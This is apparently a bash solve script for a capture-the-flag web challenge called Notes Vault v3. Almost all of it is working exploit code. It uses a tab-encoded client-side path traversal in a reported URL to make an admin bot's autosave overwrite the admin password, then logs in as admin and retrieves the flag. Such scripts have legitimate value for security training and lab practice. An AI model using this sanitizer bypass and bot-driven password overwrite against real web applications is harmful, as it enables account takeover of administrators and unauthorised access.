#!/bin/bash
#
# Notes Vault v3 (hard CSPT) - black-box solve.
#
#   file:  .%09./profile/password   (URLSearchParams decodes %09 -> TAB)
#   after the client sanitizer ignores it, WHATWG strips the TAB, giving
#   /api/v1/notes/../profile/password  ->  /api/v1/profile/password
#
set -e

BASE="${1:-http://localhost:3002}"
ATTACKER="solver_$RANDOM"
NEWPW="owned_$RANDOM"
JAR="$(mktemp)"
ADMIN_JAR="$(mktemp)"

echo "[*] target: $BASE"

curl -s -c "$JAR" -b "$JAR" \
  -d "username=$ATTACKER&password=pw" "$BASE/signup" >/dev/null

PAYLOAD="$BASE/#file=.%09./profile/password&draft=password%3D$NEWPW"
echo "[*] reporting: $PAYLOAD"
curl -s -c "$JAR" -b "$JAR" --data-urlencode "url=$PAYLOAD" "$BASE/report" >/dev/null

echo "[*] waiting for the admin bot to run the autosave..."
for _ in $(seq 1 12); do
  sleep 2
  if curl -s -c "$ADMIN_JAR" -b "$ADMIN_JAR" \
      -d "username=admin&password=$NEWPW" "$BASE/login" -o /dev/null -w '%{http_code}' | grep -q 302; then
    echo "[+] admin password is now $NEWPW"
    curl -s -b "$ADMIN_JAR" "$BASE/api/v1/admin/flag"
    echo
    exit 0
  fi
done

echo "[-] exploit did not land in time"
exit 1
